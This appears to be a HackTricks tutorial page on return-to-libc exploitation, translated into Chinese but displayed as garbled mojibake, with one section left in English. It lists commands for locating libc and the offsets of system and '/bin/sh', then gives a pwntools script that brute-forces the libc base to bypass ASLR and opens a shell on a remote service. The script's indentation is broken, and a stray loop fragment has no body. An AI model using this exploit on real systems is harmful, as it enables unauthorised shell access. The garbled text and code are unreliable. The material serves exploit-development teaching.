<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


**å¦‚æœæ‚¨æ‰¾åˆ°äº†ä¸€ä¸ªæœ‰æ¼æ´çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”è®¤ä¸ºå¯ä»¥åˆ©ç”¨Ret2Libè¿›è¡Œåˆ©ç”¨ï¼Œè¿™é‡Œæœ‰ä¸€äº›åŸºæœ¬æ­¥éª¤ä¾›æ‚¨å‚è€ƒã€‚**

# å¦‚æœæ‚¨åœ¨**ä¸»æœºå†…**

## æ‚¨å¯ä»¥æ‰¾åˆ°**libcåº“çš„åœ°å€**
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
å¦‚æœæ‚¨æƒ³æ£€æŸ¥ASLRæ˜¯å¦æ›´æ”¹äº†libcçš„åœ°å€ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## è·å–systemå‡½æ•°çš„åç§»é‡
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## è·å– "/bin/sh" çš„åç§»é‡
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

å¦‚æœè¿›ç¨‹æ¯æ¬¡ä¸å…¶é€šä¿¡æ—¶éƒ½ä¼šåˆ›å»º**å­è¿›ç¨‹**ï¼ˆç½‘ç»œæœåŠ¡å™¨ï¼‰ï¼Œå°è¯•**è¯»å–**è¯¥æ–‡ä»¶ï¼ˆå¯èƒ½éœ€è¦ä½¿ç”¨rootæƒé™ï¼‰ã€‚

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è¿›ç¨‹å†…**libcåŠ è½½çš„ç¡®åˆ‡ä½ç½®**ä»¥åŠ**æ¯ä¸ªå­è¿›ç¨‹å°†è¦åŠ è½½çš„ä½ç½®**ã€‚

![](<../../.gitbook/assets/image (95).png>)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒåŠ è½½åœ¨**0xb75dc000**ï¼ˆè¿™å°†æ˜¯libcçš„åŸºå€ï¼‰

## ä½¿ç”¨gdb-peda

ä½¿ç”¨gdb-pedaè·å–**system**å‡½æ•°ã€**exit**å‡½æ•°å’Œå­—ç¬¦ä¸²**"/bin/sh"**çš„åœ°å€ï¼š
```
p system
p exit
find "/bin/sh"
```
# ç»•è¿‡ASLR

æ‚¨å¯ä»¥å°è¯•å¯¹libcçš„åŸºå€è¿›è¡Œæš´åŠ›ç ´è§£ã€‚
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# ä»£ç 

## Ret2Lib

### Introduction

In this section, we will cover the basics of Return-to-libc (Ret2Lib) attacks. These attacks are a variation of Return Oriented Programming (ROP) attacks, where instead of chaining together small code snippets (gadgets) already present in the program, we chain together function calls from the standard C library (`libc`). This technique is useful when Data Execution Prevention (DEP) is enabled, preventing the execution of code on the stack.

### Steps

1. **Find `libc` Address**: The first step is to find the address of the `libc` library in the program's memory space. This can be done by leaking addresses or using techniques like Partial Overwrite.

2. **Find Function Addresses**: Next, we need to find the addresses of the functions we want to call from `libc`. Common functions used in Ret2Lib attacks include `system`, `execve`, `bin/sh`, etc.

3. **Craft Payload**: Craft a payload that chains together the addresses of the functions in `libc` that you want to call. This payload will overwrite the return address on the stack with the address of the first function to call.

4. **Exploit**: Finally, trigger the vulnerability in the program to execute the crafted payload. This will lead to the execution of the functions from `libc` as part of the attack.

### Conclusion

Return-to-libc attacks are a powerful technique to bypass DEP and execute code from the `libc` library. By chaining together function calls, attackers can achieve their malicious goals without needing to inject code into the program's memory space.
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
